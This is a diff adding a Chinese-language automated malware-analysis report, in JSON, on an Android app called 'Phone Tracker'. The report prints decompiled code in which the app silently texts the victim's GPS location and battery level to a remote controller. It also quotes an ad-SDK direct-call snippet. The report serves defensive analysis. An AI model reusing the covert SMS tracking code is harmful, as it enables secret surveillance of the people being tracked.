@@ -1,0 +1,105 @@
+{
+  "APK信息": {
+    "文件名": "619a181926dca00231a5030bc5618947a312ba1d9621caccf15bfe9212358d85.apk",
+    "sha256": "619a181926dca00231a5030bc5618947a312ba1d9621caccf15bfe9212358d85",
+    "包名": "com.kenchtahm.kalistaphone",
+    "应用名": "Phone Tracker",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 346.9
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\kenchtahm\\kalistaphone\\batteryact;",
+          "method_signature": "if(batteryact.this.senderTel.equals(dBHelper.getContact(\"-2\")",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(batteryact.this.senderTel, null, \"infoosad \" + batteryact.batLevel + \" http://maps.google.com/maps?q=\" + location.getLatitude() + \",\" + location.getLongitude(), null, null);",
+          "malicious_code_snippet_context": "                          e.printStackTrace();\n                      }\n                  } else {\n>>>                     SmsManager.getDefault().sendTextMessage(batteryact.this.senderTel, null, \"infoosad \" + batteryact.batLevel + \" http://maps.google.com/maps?q=\" + location.getLatitude() + \",\" + location.getLongitude(), null, null);\n                  }\n                  if (batteryact.this.locationListenerGPS != null) {\n                      batteryact.this.lm.removeUpdates(batteryact.this.locationListenerGPS);",
+          "behavior_description": "该代码是典型的短信远程控制木马回传逻辑：应用在后台接收控制指令短信后，通过 SmsManager.getDefault().sendTextMessage() 静默向指令发送方号码（senderTel，即远程控制者）回复短信，内容包含设备电量（batLevel）和GPS实时位置（经纬度拼接成Google Maps链接），实现对受害者的远程定位追踪。数据流向：GPS定位数据(location.getLatitude()/getLongitude())与电池电量 → sendTextMessage() 静默外发短信，全程无用户感知，直接造成位置隐私泄露并可能产生短信资费损失。另一分支还通过AsyncTask将位置数据发送至数据库硬编码号码（dBHelper.getContact(\"-2\").phone），进一步印证其受控回传行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.CALL",
+              "android.intent.action.DIAL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\facebook\\ads\\internal\\a\\c;",
+          "method_signature": "if(!r.a(strC)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "String strC = iVar.c();\nif (!r.a(strC) && (strC.startsWith(\"tel:\") || strC.startsWith(\"telprompt:\"))) {\n    return new Intent(\"android.intent.action.CALL\", Uri.parse(strC));\n}",
+          "malicious_code_snippet_context": "  \n      private Intent b(i iVar) {\n          if (!r.a(iVar.a()) && f.a(this.b, iVar.a())) {\n>>>             String strC = iVar.c();\n>>>             if (!r.a(strC) && (strC.startsWith(\"tel:\") || strC.startsWith(\"telprompt:\"))) {\n>>>                 return new Intent(\"android.intent.action.CALL\", Uri.parse(strC));\n>>>             }\n              PackageManager packageManager = this.b.getPackageManager();\n              if (r.a(iVar.b()) && r.a(strC)) {\n                  return packageManager.getLaunchIntentForPackage(iVar.a());",
+          "behavior_description": "该代码位于广告SDK内部（com.facebook.ads.internal），用于处理广告点击跳转逻辑。代码从广告配置对象 iVar 中获取服务器下发的 URL 字符串（iVar.c()），当该 URL 以 \"tel:\" 或 \"telprompt:\" 开头时，构造 ACTION_CALL Intent 直接发起电话呼叫。数据流向：广告服务器下发的 tel: 链接（iVar.c()）→ Intent(\"android.intent.action.CALL\") 直接拨打电话。注意此处使用的是 ACTION_CALL 而非 ACTION_DIAL，前者在应用持有 CALL_PHONE 权限时无需经过拨号界面用户确认即可直接拨号。由于呼叫目标号码完全由远程广告内容控制，属于典型的点击拨号（click-to-call）广告行为；在已确认恶意的样本环境中，若广告内容被恶意操控，可诱导用户点击广告后静默拨打付费/增值号码造成话费损失，但该行为需要用户点击广告触发且依赖 CALL_PHONE 权限，故判定为灰色行为而非直接恶意。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
